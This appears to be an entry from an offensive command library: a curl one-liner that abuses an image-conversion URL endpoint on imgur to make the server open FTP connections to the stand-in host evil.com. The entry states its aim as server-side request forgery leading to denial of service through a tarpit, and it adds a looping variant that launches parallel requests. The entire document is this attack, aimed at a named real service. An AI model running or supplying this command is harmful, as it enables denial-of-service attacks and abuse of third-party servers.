---
data: 'curl "https://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST"'
tags:
  - ssrf
  - ftp
type: command
output: HTTP response; opens long-lived FTP connection
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:08.967Z'
id: 5ffed3f4-e8ad-4dac-a3e4-a5236000c5cd
verified: false
validated: true
submitted: true
---
# curl-ftp-trigger

## Command

```bash
curl "https://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST"
```

## Description

Trigger FTP SSRF for DoS via tarpit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=` | FTP URL to tarpitted port | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

Loop for DoS: `for i in {1..10}; do curl ... & done`

## Expected Output

Connection held open.

## Related

- [[procedures/Explore-FTP-DoS-with-Iptables-Tarpit]]
